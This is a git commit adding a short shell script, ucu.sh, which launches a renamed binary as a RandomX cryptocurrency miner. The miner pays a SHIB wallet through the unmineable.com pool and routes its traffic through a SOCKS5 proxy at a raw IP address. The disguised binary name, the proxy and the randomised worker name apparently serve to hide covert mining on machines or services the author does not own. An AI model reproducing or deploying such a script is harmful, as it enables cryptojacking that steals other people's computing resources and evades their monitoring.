b8aea82a930a5763fc91f4531d40ca341b805451
JohnPHanna <88381331+JohnPHanna@users.noreply.github.com>
2021-08-03 19:00:29 +0700

    Create ucu.sh

---
+++ ucu.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+chmod +x ucu
+./ucu --disable-gpu --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet SHIB:0xc47ac4f4bb1e94f545738b2b8043bdfd711deaeb --worker $(echo $(shuf -i 1000-9999 -n 1)-MoodX) --disable-msr-tweaks --keepalive value true --cpu-threads 2 --cpu-threads-intensity 2 --cpu-threads-priority 2 --proxy socks5://192.252.209.155:14455
